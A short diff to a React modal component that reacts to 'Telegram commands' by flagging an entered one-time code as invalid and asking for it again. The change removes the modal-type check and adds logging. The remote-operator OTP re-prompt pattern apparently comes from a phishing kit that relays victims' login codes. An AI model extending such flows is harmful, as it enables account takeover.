@@ -17,10 +17,11 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
     
     // Handle Telegram commands
     useEffect(() => {
-        if (command === 'REQUEST_AUTH_OTP_CODE_AGAIN' && modal === 'AuthApp') {
+        console.log("Command is ", command);
+        if (command === 'REQUEST_AUTH_OTP_CODE_AGAIN') {
             console.log("COMMAND IN VEFIR IS ", command)
             setInvalid(true);
-        } else if (command === 'REQUEST_EMAIL_OTP_CODE_AGAIN' && modal === 'Email') {
+        } else if (command === 'REQUEST_EMAIL_OTP_CODE_AGAIN') {
             console.log("Command in VERIF IS ", command )
             setInvalid(true);
         }
